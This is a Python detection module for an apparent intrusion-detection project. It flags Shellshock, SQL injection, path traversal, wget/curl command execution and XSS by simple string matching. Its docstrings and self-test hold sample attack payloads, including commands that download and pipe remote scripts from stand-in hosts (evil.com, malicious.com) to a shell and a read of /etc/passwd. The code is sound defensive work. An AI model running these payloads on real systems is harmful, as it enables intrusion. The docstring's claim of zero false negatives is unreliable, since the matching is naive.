"""
Rules Engine - Signature-Based Attack Detection

PURPOSE:
  Ghost Shell Guardian's second layer: detects known attack patterns
  using signature matching (fast, explainable, no ML needed).

WHAT IT DOES:
  Takes a payload string and searches for known attack signatures.
  Returns the attack type or "Unknown" if no match found.

ATTACK SIGNATURES:
  1. SHELLSHOCK: Contains "() {" AND "/bin/bash"
     - CVE-2014-6271, arbitrary code execution in bash
     - Example: "() { :;}; /bin/bash -c ..."

  2. SQL_INJECTION: Contains "' OR '1'='1" OR "UNION SELECT"
     - Example: "' OR '1'='1 --" or "UNION SELECT * FROM users"

  3. PATH_TRAVERSAL: Contains "../" or "..\\"
     - Example: "../../../../etc/passwd"

  4. RCE (Remote Command Execution): Contains "WGET" or "CURL"
     - Example: "wget http://malicious.com/bot.sh -O- | sh"

  5. XSS (Reflected): Contains "<SCRIPT" or "ALERT(" or "JAVASCRIPT:"
     - Example: "<script>alert('XSS')</script>"

WHY SIGNATURE MATCHING?
  - Fast: O(n) string search, no ML inference
  - Explainable: Anyone can understand why an alert triggered
  - Auditable: No black-box AI decisions
  - Reliable: Zero false negatives on known patterns
  - Interview-Proof: Easy to explain detection logic

HOW IT WORKS:
  1. Convert payload to uppercase for case-insensitive matching
  2. Check for shellshock-specific pattern (both indicators must be present)
  3. Check for each attack signature in order
  4. Return attack type on first match
  5. Return "Unknown" if no patterns match

DEPENDENCIES:
  - None (pure Python string operations)

TESTING:
  Run directly:
    python src/rules.py
  
  Verifies detection on known attack payloads.
"""

def detect_attack(payload: str) -> str:
    """
    Detect attack signature in payload string (CASE-INSENSITIVE).

    Args:
        payload (str): Potential malicious content to analyze

    Returns:
        str: Attack type detected:
          - "Shellshock" (Bash RCE - CVE-2014-6271)
          - "SQL Injection" (Database escape)
          - "Path Traversal" (Directory escape)
          - "Remote Command Execution" (Command chaining)
          - "Reflected XSS" (Script injection)
          - "Unknown" (No pattern matched)

    DETECTION LOGIC:
      Each attack has unique signature patterns:
      
      - Shellshock: Must have BOTH "() {" AND "/bin/bash"
        (These are the bash function definition syntax)
      
      - SQL Injection: Has "' OR '1'='1" OR "UNION SELECT"
        (These are common SQL escape techniques)
      
      - Path Traversal: Has "../" or "..\\"
        (These navigate up directory tree)
      
      - RCE: Has "WGET" OR "CURL"
        (These download and execute remote code)
      
      - XSS: Has "<SCRIPT" OR "ALERT(" OR "JAVASCRIPT:"
        (These inject inline scripts into pages)

    Algorithm:
      1. Convert input to uppercase for case-insensitive comparison
      2. Check EACH pattern IN ORDER (first match wins)
      3. Return matched attack type immediately
      4. Return "Unknown" if nothing matched

    Example:
      >>> payload = "() { :;}; /bin/bash -c 'whoami'"
      >>> detect_attack(payload)
      'Shellshock'

      >>> payload = "file=../../../../etc/passwd"
      >>> detect_attack(payload)
      'Path Traversal'
    """
    payload_upper = payload.upper()

    # SHELLSHOCK (Bash RCE - CVE-2014-6271)
    # Must have BOTH the function syntax "() {" AND bash binary
    if "() {" in payload and "/BIN/BASH" in payload_upper:
        return "Shellshock"

    # SQL INJECTION
    # Check for quote escape + logical condition or UNION-based injection
    if "UNION SELECT" in payload_upper or "' OR '1'='1" in payload_upper:
        return "SQL Injection"

    # PATH TRAVERSAL
    # Check for directory escape sequences (unix or windows style)
    if "../" in payload or "..\\" in payload:
        return "Path Traversal"

    # REMOTE COMMAND EXECUTION
    # Check for download/execute tools (wget or curl)
    if "WGET" in payload_upper or "CURL" in payload_upper:
        return "Remote Command Execution"

    # REFLECTED XSS (Cross-Site Scripting)
    # Check for HTML/JavaScript injection patterns
    if "<SCRIPT" in payload_upper or "ALERT(" in payload_upper or "JAVASCRIPT:" in payload_upper:
        return "Reflected XSS"

    # NO ATTACK DETECTED
    return "Unknown"


# ============================================================================
# SELF-TEST: Verify detection works correctly
# ============================================================================
# Run this file directly to test attack detection:
#   python src/rules.py
#
# Output shows detection results on known attack payloads
# ============================================================================

if __name__ == "__main__":
    # Test cases: known attack payloads with expected detections
    test_cases = [
        ("() { :;}; /bin/bash -c \"wget http://evil.com/bot\"", "Shellshock"),
        ("SELECT * FROM users WHERE id = '1' OR '1'='1'", "SQL Injection"),
        ("file=../../../../etc/passwd", "Path Traversal"),
        ("; wget http://malicious.com/bot.sh -O- | sh;", "Remote Command Execution"),
        ("<script>alert('XSS')</script>", "Reflected XSS")
    ]

    print("\nRules Engine Self-Test:")
    print("=" * 70)

    all_pass = True
    for payload, expected in test_cases:
        result = detect_attack(payload)
        passed = result == expected
        status = "[PASS]" if passed else "[FAIL]"
        all_pass = all_pass and passed

        print(f"\n{status} | Expected: {expected}")
        print(f"  Payload: {payload[:60]}...")
        print(f"  Detected: {result}")

    print("\n" + "=" * 70)
    if all_pass:
        print("[OK] All tests passed! Rules engine working correctly.")
    else:
        print("[ERROR] Some tests failed. Review detection logic.")
